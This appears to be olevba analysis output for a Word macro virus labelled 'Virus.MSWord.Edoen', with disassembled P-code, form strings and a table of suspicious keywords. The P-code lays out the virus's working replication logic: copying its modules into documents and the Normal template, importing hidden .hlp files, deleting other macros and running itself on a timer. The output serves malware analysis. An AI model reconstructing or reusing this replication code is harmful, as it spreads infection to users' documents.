' Line #146:
' 	EndSub 
' Line #147:
' 	FuncDefn (Sub pesan())
' Line #148:
' 	OnError (Resume Next) 
' Line #149:
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	St hari 
' Line #150:
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	St bulan 
' Line #151:
' 	Ld Date 
' 	ArgsLd Year 0x0001 
' 	St tahun 
' Line #152:
' 	Ld hari 
' 	LitDI2 0x0016 
' 	Ge 
' 	Ld bulan 
' 	LitDI2 0x000B 
' 	Eq 
' 	Paren 
' 	And 
' 	Paren 
' 	Ld hari 
' 	LitDI2 0x000F 
' 	Le 
' 	Paren 
' 	Ld bulan 
' 	LitDI2 0x000C 
' 	Eq 
' 	Paren 
' 	And 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #153:
' 	Ld form 
' 	ArgsMemCall show 0x0000 
' Line #154:
' 	EndIfBlock 
' Line #155:
' 	Ld bulan 
' 	LitDI2 0x0001 
' 	Ge 
' 	Paren 
' 	Ld tahun 
' 	LitDI2 0x07D1 
' 	Ge 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #156:
' 	Ld hari 
' 	LitDI2 0x0002 
' 	Eq 
' 	Paren 
' 	Ld hari 
' 	LitDI2 0x0005 
' 	Eq 
' 	Paren 
' 	Or 
' 	Ld hari 
' 	LitDI2 0x0008 
' 	Eq 
' 	Paren 
' 	Or 
' 	Ld hari 
' 	LitDI2 0x000D 
' 	Eq 
' 	Paren 
' 	Or 
' 	Ld hari 
' 	LitDI2 0x0010 
' 	Eq 
' 	Paren 
' 	Or 
' 	Ld hari 
' 	LitDI2 0x0015 
' 	Eq 
' 	Paren 
' 	Or 
' 	Ld hari 
' 	LitDI2 0x001A 
' 	Eq 
' 	Paren 
' 	Or 
' 	Ld hari 
' 	LitDI2 0x001B 
' 	Eq 
' 	Paren 
' 	Or 
' 	Ld hari 
' 	LitDI2 0x001D 
' 	Eq 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #157:
' 	Ld edoen 
' 	ArgsMemCall bAntai 0x0000 
' Line #158:
' 	Ld form 
' 	ArgsMemCall show 0x0000 
' Line #159:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #160:
' 	EndIfBlock 
' Line #161:
' 	EndIfBlock 
' Line #162:
' 	EndSub 
' Line #163:
' 	FuncDefn (Sub Con())
' Line #164:
' 	OnError (Resume Next) 
' Line #165:
' 	OnError (Resume Next) 
' Line #166:
' 	Ld wdProgramPath 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	St tempat 
' Line #167:
' 	Ld tempat 
' 	LitStr 0x000A "\offic.hlp"
' 	Add 
' 	ArgsLd Dir 0x0001 
' 	St copi 
' Line #168:
' 	Ld copi 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #169:
' 	Ld tempat 
' 	LitStr 0x000A "\offic.hlp"
' 	Add 
' 	St copi1 
' Line #170:
' 	Ld copi1 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #171:
' 	EndIfBlock 
' Line #172:
' 	Ld wdProgramPath 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	St tempat 
' Line #173:
' 	Ld tempat 
' 	LitStr 0x000B "\offic1.hlp"
' 	Add 
' 	ArgsLd Dir 0x0001 
' 	St copi 
' Line #174:
' 	Ld copi 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #175:
' 	Ld tempat 
' 	LitStr 0x000B "\offic1.hlp"
' 	Add 
' 	St copi1 
' Line #176:
' 	Ld copi1 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #177:
' 	EndIfBlock 
' Line #178:
' 	EndSub 
' Line #179:
' 	FuncDefn (Sub ViewVBCode())
' Line #180:
' 	OnError (Resume Next) 
' Line #181:
' 	LitStr 0x001A "not installed this section"
' 	ArgsCall MsgBox 0x0001 
' Line #182:
' 	EndSub 
' Line #183:
' 	FuncDefn (Sub bAntai())
' Line #184:
' 	OnError (Resume Next) 
' Line #185:
' 	LineCont 0x0004 1E 00 00 00
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x000F "Kudekap Tubuhmu"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000E "Kukecup dahimu"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000F "Kulumat Bibirmu"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0020 "Kutelusuri Seluruh Lekuk Tubuhmu"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0018 "Ku Berdiri dan tersenyum"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0029 "Sambil Berlalu ku Ucapkan Selamat Tinggal"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld Selection 
' 	ArgsMemCall InsertBefore 0x0001 
' Line #186:
' 	LitDI2 0x000E 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt Size 
' Line #187:
' 	Ld wdToggle 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt Italic 
' Line #188:
' 	Ld wdAnimationShimmer 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt Animation 
' Line #189:
' 	Ld ActiveDocument 
' 	ArgsMemCall Set 0x0000 
' Line #190:
' 	Ld ActiveDocument 
' 	ArgsMemCall UndoClear 0x0000 
' Line #191:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #192:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #193:
' 	EndSub 
' Line #194:
' 	FuncDefn (Function CopytoAD())
' Line #195:
' 	OnError (Resume Next) 
' Line #196:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #197:
' 	LitVarSpecial (False)
' 	St ayaDoc 
' Line #198:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set AD 
' Line #199:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set NT 
' Line #200:
' 	LitDI2 0x0000 
' 	St aya 
' Line #201:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld AD 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #202:
' 	Ld i 
' 	Ld AD 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St Namacr 
' Line #203:
' 	Ld Namacr 
' 	LitStr 0x0005 "edoen"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St ayaDoc 
' 	EndIf 
' Line #204:
' 	Ld Namacr 
' 	LitStr 0x0005 "edoen"
' 	Ne 
' 	Paren 
' 	Ld Namacr 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Paren 
' 	And 
' 	Ld Namacr 
' 	LitStr 0x0013 "Reference to Normal"
' 	Ne 
' 	Paren 
' 	And 
' 	Ld Namacr 
' 	LitStr 0x0004 "form"
' 	Ne 
' 	Paren 
' 	And 
' 	Ld Namacr 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #205:
' 	LitStr 0x0025 "Sorry proses penghapusan virus macro "
' 	Ld Namacr 
' 	Concat 
' 	Paren 
' 	Ld vbInformation 
' 	LitStr 0x0009 "Perhatian"
' 	ArgsCall MsgBox 0x0003 
' Line #206:
' 	LineCont 0x0004 09 00 0A 00
' 	Ld AD 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld Namacr 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #207:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #208:
' 	EndIfBlock 
' Line #209:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #210:
' 	Ld ayaDoc 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #211:
' 	Ld NT 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld AD 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0005 "edoen"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #212:
' 	LineCont 0x0008 09 00 0A 00 11 00 0A 00
' 	Ld NT 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld AD 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0004 "form"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #213:
' 	LitVarSpecial (False)
' 	Ld AD 
' 	MemSt ReadOnlyRecommended 
' Line #214:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	St ss 
' Line #215:
' 	LitStr 0x0008 "Document"
' 	Ld ss 
' 	LitDI2 0x0001 
' 	LitDI2 0x0008 
' 	ArgsLd Mid$ 0x0003 
' 	Ne 
' 	IfBlock 
' Line #216:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #217:
' 	EndIfBlock 
' Line #218:
' 	EndIfBlock 
' Line #219:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #220:
' 	EndFunc 
' Line #221:
' Line #222:
' 	FuncDefn (Function copYtoNT())
' Line #223:
' 	OnError (Resume Next) 
' Line #224:
' 	LitVarSpecial (False)
' 	St ayaDoc 
' Line #225:
' 	LitVarSpecial (False)
' 	St ayanor 
' Line #226:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set AD 
' Line #227:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set NT 
' Line #228:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #229:
' 	Ld i 
' 	Ld NT 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St nmacr 
' Line #230:
' 	Ld nmacr 
' 	LitStr 0x0005 "edoen"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St ayanor 
' 	EndIf 
' Line #231:
' 	LineCont 0x0004 07 00 08 00
' 	Ld nmacr 
' 	LitStr 0x0005 "edoen"
' 	Ne 
' 	Paren 
' 	Ld nmacr 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Paren 
' 	And 
' 	Ld nmacr 
' 	LitStr 0x0013 "Reference to Normal"
' 	Ne 
' 	Paren 
' 	And 
' 	Ld nmacr 
' 	LitStr 0x0004 "form"
' 	Ne 
' 	Paren 
' 	And 
' 	Ld nmacr 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #232:
' 	LitStr 0x0025 "sorry proses penghapusan virus macro "
' 	Ld nmacr 
' 	Concat 
' 	Paren 
' 	Ld vbInformation 
' 	LitStr 0x0011 "Proses Pembasmian"
' 	ArgsCall MsgBox 0x0003 
' Line #233:
' 	LineCont 0x0004 09 00 0A 00
' 	Ld NT 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld nmacr 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #234:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #235:
' 	EndIfBlock 
' Line #236:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #237:
' 	Ld ayanor 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #238:
' 	LineCont 0x0008 09 00 0A 00 11 00 0A 00
' 	Ld AD 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NT 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0005 "edoen"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #239:
' 	LineCont 0x0008 09 00 0A 00 11 00 0A 00
' 	Ld AD 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NT 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0004 "form"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #240:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #241:
' 	EndIfBlock 
' Line #242:
' 	Ld edoen 
' 	ArgsMemCall CopyDot 0x0000 
' Line #243:
' 	EndFunc 
' Line #244:
' 	FuncDefn (Function cekNormal() As Boolean)
' Line #245:
' 	OnError (Resume Next) 
' Line #246:
' 	LitVarSpecial (False)
' 	St ayanor 
' Line #247:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set NT 
' Line #248:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #249:
' 	Ld i 
' 	Ld NT 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St nmacr 
' Line #250:
' 	Ld nmacr 
' 	LitStr 0x0005 "edoen"
' 	Eq 
' 	IfBlock 
' Line #251:
' 	LitVarSpecial (True)
' 	St ayanor 
' Line #252:
' 	LitDI2 0x0064 
' 	St i 
' Line #253:
' 	EndIfBlock 
' Line #254:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #255:
' 	Ld ayanor 
' 	St cekNormal 
' Line #256:
' 	EndFunc 
' Line #257:
' 	FuncDefn (Function CekDocument() As Boolean)
' Line #258:
' 	OnError (Resume Next) 
' Line #259:
' 	LitVarSpecial (False)
' 	St ayanor 
' Line #260:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set NT 
' Line #261:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #262:
' 	Ld i 
' 	Ld NT 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St nmacr 
' Line #263:
' 	Ld nmacr 
' 	LitStr 0x0005 "edoen"
' 	Eq 
' 	IfBlock 
' Line #264:
' 	LitVarSpecial (True)
' 	St ayanor 
' Line #265:
' 	LitDI2 0x0064 
' 	St i 
' Line #266:
' 	EndIfBlock 
' Line #267:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #268:
' 	Ld ayanor 
' 	St CekDocument 
' Line #269:
' 	EndFunc 
' Line #270:
' 	FuncDefn (Sub sinA())
' Line #271:
' 	Ld wdStartupPath 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	St tempat 
' Line #272:
' 	Ld tempat 
' 	LitStr 0x0006 "\*.dot"
' 	Add 
' 	St copi 
' Line #273:
' 	Ld copi 
' 	Ld Application 
' 	MemLd FileSearch 
' 	MemSt fileName 
' Line #274:
' 	Ld Application 
' 	MemLd FileSearch 
' 	ArgsMemCall Execute 0x0000 
' Line #275:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd FileSearch 
' 	MemLd FoundFiles 
' 	MemLd Count 
' 	For 
' Line #276:
' 	Ld i 
' 	Ld Application 
' 	MemLd FileSearch 
' 	MemLd FoundFiles 
' 	ArgsMemLd Item 0x0001 
' 	St copi 
' Line #277:
' 	Ld copi 
' 	LitStr 0x0008 "news.dot"
' 	Ne 
' 	IfBlock 
' Line #278:
' 	Ld edoen 
' 	ArgsMemCall CopytoAD 0x0000 
' Line #279:
' 	Ld copi 
' 	Paren 
' 	Ld Application 
' 	MemLd Documents 
' 	ArgsMemCall Option 0x0001 
' Line #280:
' 	Ld edoen 
' 	ArgsMemCall CopytoAD 0x0000 
' Line #281:
' 	Ld Save 
' 	Paren 
' 	Ld Application 
' 	MemLd Documents 
' 	ArgsMemCall Close 0x0001 
' Line #282:
' 	EndIfBlock 
' Line #283:
' 	EndSub 
' Line #284:
' 	FuncDefn (Sub rame1())
' Line #285:
' 	Ld wdGraphicsFiltersPath 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	St pos 
' Line #286:
' 	Ld pos 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #287:
' 	Ld pos 
' 	Ld wdStartupPath 
' 	Ld Options 
' 	ArgsMemSt DefaultFilePath 0x0001 
' Line #288:
' 	Ld edoen 
' 	ArgsMemCall CopyDot 0x0000 
' Line #289:
' 	EndIfBlock 
' Line #290:
' 	Ld Now 
' 	LitStr 0x0008 "01:00:00"
' 	ArgsLd TimeValue 0x0001 
' 	Add 
' 	ParamNamed when 
' 	LitStr 0x000A "edoen.rame"
' 	ParamNamed New 
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #291:
' 	EndSub 
' Line #292:
' 	FuncDefn (Sub rame())
' Line #293:
' 	LitStr 0x000F "Cianjur Merdeka"
' 	Ld Application 
' 	MemSt Caption 
' Line #294:
' 	Ld edoen 
' 	ArgsMemCall copYtoNT 0x0000 
' Line #295:
' 	Ld edoen 
' 	ArgsMemCall CopytoAD 0x0000 
' Line #296:
' 	Ld Now 
' 	LitStr 0x0008 "01:00:00"
' 	ArgsLd TimeValue 0x0001 
' 	Add 
' 	ParamNamed when 
' 	LitStr 0x000A "edoen.sory"
' 	ParamNamed New 
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #297:
' 	EndSub 
' Line #298:
' 	FuncDefn (Sub sory())
' Line #299:
' 	OnError (Resume Next) 
' Line #300:
' 	Ld edoen 
' 	ArgsMemCall pesan 0x0000 
' Line #301:
' 	Ld edoen 
' 	ArgsMemCall rame 0x0000 
' Line #302:
' 	EndSub 
' Line #303:
' 	FuncDefn (Sub FilePrintPreview())
' Line #304:
' 	OnError (Resume Next) 
' Line #305:
' 	Ld edoen 
' 	ArgsMemCall copYtoNT 0x0000 
' Line #306:
' 	Ld edoen 
' 	ArgsMemCall CopytoAD 0x0000 
' Line #307:
' 	Ld ActiveDocument 
' 	ArgsMemCall PrintPreview 0x0000 
' Line #308:
' 	EndSub 
' Line #309:
' Macros/VBA/form - 6563 bytes
' Line #0:
' Line #1:
' Line #2:
' Line #3:
' Line #4:
' Line #5:
' Line #6:
' Line #7:
' Line #8:
' Line #9:
' Line #10:
' Line #11:
' Line #12:
' Line #13:
' Line #14:
' Line #15:
' Line #16:
' Line #17:
' Line #18:
' Line #19:
' Line #20:
' Line #21:
' Line #22:
' Line #23:
' Line #24:
' Line #25:
' Line #26:
' Line #27:
' Line #28:
' Line #29:
' Line #30:
' Line #31:
' Line #32:
' Line #33:
' Line #34:
' Line #35:
' Line #36:
' Line #37:
' Line #38:
' Line #39:
' Line #40:
' Line #41:
' Line #42:
' Line #43:
' Line #44:
' Line #45:
' Line #46:
' Line #47:
' Line #48:
' Line #49:
' Line #50:
' Line #51:
' Line #52:
' Line #53:
' Line #54:
' Line #55:
' Line #56:
' Line #57:
' Line #58:
' Line #59:
' Line #60:
' Line #61:
' Line #62:
' Line #63:
' Line #64:
' Line #65:
' Line #66:
' Line #67:
' Line #68:
' Line #69:
' Line #70:
' Line #71:
' Line #72:
' Line #73:
' Line #74:
' Line #75:
' Line #76:
' Line #77:
' 	Dim 
' 	VarDefn d (As Integer)
' Line #78:
' 	Dim 
' 	VarDefn tek (As Integer)
' Line #79:
' 	Dim 
' 	VarDefn txt (As String)
' Line #80:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #81:
' 	LitStr 0x0027 "Anda belum beruntung silahkan coba lagi"
' 	ArgsCall MsgBox 0x0001 
' Line #82:
' 	EndSub 
' Line #83:
' Line #84:
' 	FuncDefn (Private Sub CommandButton1_MouseMove(ByVal Button As Integer, ByVal Shift As Integer, ByVal X As Single, ByVal Y As Single))
' Line #85:
' 	LitVarSpecial (False)
' 	Ld Label2 
' 	MemSt Visible 
' Line #86:
' 	Ld Rnd 
' 	LitDI2 0x007B 
' 	Mul 
' 	St atas 
' Line #87:
' 	Ld Rnd 
' 	LitDI2 0x00DE 
' 	Mul 
' 	St kiri 
' Line #88:
' 	Ld atas 
' 	Ld CommandButton1 
' 	MemSt Top 
' Line #89:
' 	Ld kiri 
' 	Ld CommandButton1 
' 	MemSt LBound 
' Line #90:
' 	Ld d 
' 	LitDI2 0x0002 
' 	Add 
' 	St d 
' Line #91:
' 	Ld txt 
' 	LitDI2 0x0001 
' 	Ld d 
' 	ArgsLd Mid$ 0x0003 
' 	Ld Label1 
' 	MemSt Caption 
' Line #92:
' 	Ld d 
' 	Ld txt 
' 	FnLen 
' 	Ge 
' 	IfBlock 
' Line #93:
' 	LitDI2 0x0000 
' 	St d 
' Line #94:
' 	LitStr 0x0000 ""
' 	Ld Label1 
' 	MemSt Caption 
' Line #95:
' 	EndIfBlock 
' Line #96:
' 	EndSub 
' Line #97:
' Line #98:
' 	FuncDefn (Private Sub Label1_DblClick(ByVal Cancel As ))
' Line #99:
' 	LitDI2 0x0002 
' 	St tek 
' Line #100:
' 	End 
' Line #101:
' 	EndSub 
' Line #102:
' Line #103:
' 	FuncDefn (Private Sub UserForm_Activate())
' Line #104:
' 	QuoteRem 0x0000 0x0030 "tempat = Options.DefaultFilePath(wdPicturesPath)"
' Line #105:
' 	QuoteRem 0x0000 0x0015 "form.Picture = tempat"
' Line #106:
' 	LitVarSpecial (True)
' 	Ld Label2 
' 	MemSt Visible 
' Line #107:
' 	LitStr 0x0040 "Salam buat semua teman-teman sepergerakan alumni SMUN Sukanagara"
' 	Ld Label2 
' 	MemSt Caption 
' Line #108:
' 	LitDI2 0x0000 
' 	St d 
' Line #109:
' 	LitDI2 0x0000 
' 	St tek 
' Line #110:
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0004 
' 	Le 
' 	Paren 
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #111:
' 	LitStr 0x001C "Tahun Baru dimana mang !!!!!"
' 	Ld form 
' 	MemSt Caption 
' Line #112:
' 	LitStr 0x009A "Selamat Tahun Baru, semoga ditahun yang baru ini kita mendapatkan kebahagiaan, Amin ...... Jika anda ingin mengakhirinya double klik pada tulisan ini     "
' 	St txt 
' Line #113:
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0004 
' 	Gt 
' 	Paren 
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0001 
' 	Ge 
' 	Paren 
' 	And 
' 	Ld Date 
' 	ArgsLd Year 0x0001 
' 	LitDI2 0x07D1 
' 	Ge 
' 	Paren 
' 	And 
' 	ElseIfBlock 
' Line #114:
' 	LitStr 0x0018 "Ah abdimah iseng wungkul"
' 	Ld form 
' 	MemSt Caption 
' Line #115:
' 	LitStr 0x007A "Ini hanya program iseng saja tidak akan merusak file anda, jika anda ingin mengakhirinya double klik pada tulisan ini     "
' 	St txt 
' Line #116:
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0004 
' 	Eq 
' 	Paren 
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0002 
' 	Ge 
' 	Paren 
' 	And 
' 	ElseIfBlock 
' Line #117:
' 	LitStr 0x001D "Ulang tahun Perlu dirayakan ?"
' 	Ld form 
' 	MemSt Caption 
' Line #118:
' 	LitStr 0x00B3 "Selamat Ulang Tahun yang lahir pada tanggal 4, semoga menjadi lebih dewasa dan mendapatkan kebahagiaan, Amin ...... Jika anda ingin mengakhirinya double klik pada tulisan ini     "
' 	St txt 
' Line #119:
' 	QuoteRem 0x0000 0x0004 "Else"
' Line #120:
' 	QuoteRem 0x0000 0x0030 "form.Caption = "Selamat Menunaikan ibadah Puasa""
' Line #121:
' 	QuoteRem 0x0000 0x00AF "txt = "Yaa ayyuhalladzina aamanu kutiba alaikumusshiam kama kutiba alalladzina minkoblikum laallakum tattakuun, jika anda ingin mengakhirinya double klik pada tulisan ini    ""
' Line #122:
' 	EndIfBlock 
' Line #123:
' 	ArgsCall Read 0x0000 
' Line #124:
' 	LitStr 0x0065 "Silahkan anda coba klik tombol OK sampai bisa dan baca tulusan yang ada dibawah, semoga anda berhasil"
' 	Ld Label1 
' 	MemSt Caption 
' Line #125:
' 	EndSub 
' Line #126:
' Line #127:
' 	FuncDefn (Private Sub UserForm_Terminate())
' Line #128:
' 	OnError (Resume Next) 
' Line #129:
' 	Ld tek 
' 	LitDI2 0x0002 
' 	Ne 
' 	IfBlock 
' Line #130:
' 	Ld form 
' 	ArgsMemCall Hide 0x0000 
' Line #131:
' 	LitStr 0x0022 "Ceuk aing double clik tulisan nana"
' 	Ld vbInformation 
' 	LitStr 0x000A "Teungawaro"
' 	ArgsLd MsgBox 0x0003 
' 	St vv 
' Line #132:
' 	Ld form 
' 	ArgsMemCall UndoAction 0x0000 
' Line #133:
' 	Ld form 
' 	ArgsMemCall show 0x0000 
' Line #134:
' 	LitDI2 0x0001 
' 	St tek 
' Line #135:
' 	EndIfBlock 
' Line #136:
' 	EndSub 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Edoen' - OLE stream: 'Macros/form/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Impact@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Edoen' - OLE stream: 'Macros/form/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Courier New
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Edoen' - OLE stream: 'Macros/form/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Courier New
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.Edoen' - OLE stream: 'Macros/form'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Edoen' - OLE stream: 'Macros/form'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.Edoen' - OLE stream: 'Macros/form'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|AutoExec  |CommandButton1_Mouse|Runs when the file is opened and ActiveX     |
|          |Move                |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

